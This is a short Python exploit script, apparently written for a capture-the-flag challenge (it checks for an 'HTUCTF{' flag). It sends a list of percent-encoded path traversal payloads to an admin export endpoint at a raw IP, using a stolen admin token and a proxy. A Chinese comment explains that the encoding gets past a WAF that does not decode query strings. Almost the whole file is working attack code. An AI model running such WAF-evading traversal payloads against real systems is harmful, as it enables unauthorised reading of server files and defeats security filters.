import sys, os, json
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px

BASE = "http://103.163.47.230:34414"
tok = json.load(open("admin_token.json"))["token"]
OP = px.opener("http://143.246.138.227:80")
OP.addheaders = [("User-Agent", "Mozilla/5.0"), ("Cookie", "htu_token=" + tok)]

# WAF 只看原始 query string（不解码），所以把 ".." 和 "flag" 百分号编码
cands = [
    "%2e%2e/%66lag",
    "%2e%2e/%66lag.txt",
    "/%66lag",
    "/%66lag.txt",
    "%2e%2e/%2e%2e/%66lag",
    "%2e%2e/%66lag%2etxt",
    "/app/%66lag",
    "/app/%66lag.txt",
    "%2e%2e/app/%66lag",
]
for f in cands:
    s, h, b = px.get(BASE + "/api/admin/export?file=" + f, OP)
    hit = "HTUCTF{" in b or "HTU{" in b or "flag{" in b
    print("%-28s %s %5d %s %s" % (f, s, len(b), "== HIT ==" if hit else "", b[:150].replace("\n", " | ")))
